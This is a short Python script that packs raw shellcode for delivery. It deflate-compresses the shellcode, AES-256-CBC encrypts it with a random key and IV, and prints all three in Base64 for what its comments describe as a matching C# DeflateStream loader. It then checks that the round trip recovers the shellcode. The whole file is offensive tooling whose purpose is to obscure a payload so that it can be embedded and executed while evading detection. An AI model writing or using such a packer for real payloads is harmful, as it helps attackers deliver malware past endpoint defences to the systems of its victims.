#!/usr/bin/env python3
import zlib
import base64
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad
import os
import struct

def build_payload(raw_shellcode_path: str) -> None:
    # 1) Read raw shellcode
    with open(raw_shellcode_path, 'rb') as f:
        shellcode = f.read()

    # 2) Compress with raw Deflate (no zlib header/footer — matches C# DeflateStream)
    #    wbits = -15 means raw deflate
    compressed = zlib.compress(shellcode, level=9)[2:-4]  # strip zlib header & adler32 footer

    # 3) Generate random AES-256 key + IV
    aes_key = os.urandom(32)
    aes_iv  = os.urandom(16)

    # 4) Encrypt
    cipher = AES.new(aes_key, AES.MODE_CBC, aes_iv)
    encrypted = cipher.encrypt(pad(compressed, AES.block_size))

    # 5) Output
    print(f"[+] AES Key (Base64):  {base64.b64encode(aes_key).decode()}")
    print(f"[+] AES IV  (Base64):  {base64.b64encode(aes_iv).decode()}")
    print(f"[+] Encrypted Payload: {base64.b64encode(encrypted).decode()}")

    # 6) Verify — use raw deflate (wbits = -15) to match C# DeflateStream
    from Crypto.Cipher import AES as AES2
    from Crypto.Util.Padding import unpad
    c2 = AES2.new(aes_key, AES2.MODE_CBC, aes_iv)
    dec = unpad(c2.decrypt(encrypted), AES.block_size)
    
    # Use raw deflate decompression (wbits = -15) instead of zlib header mode
    decompressed = zlib.decompress(dec, -15)
    assert decompressed == shellcode, "VERIFICATION FAILED — shellcode mismatch"
    print(f"[✓] AES→Deflate→Raw decryption verified OK ({len(shellcode)} bytes)")

if __name__ == "__main__":
    import sys
    if len(sys.argv) < 2:
        print(f"Usage: {sys.argv[0]} <raw_shellcode.bin>")
        sys.exit(1)
    build_payload(sys.argv[1])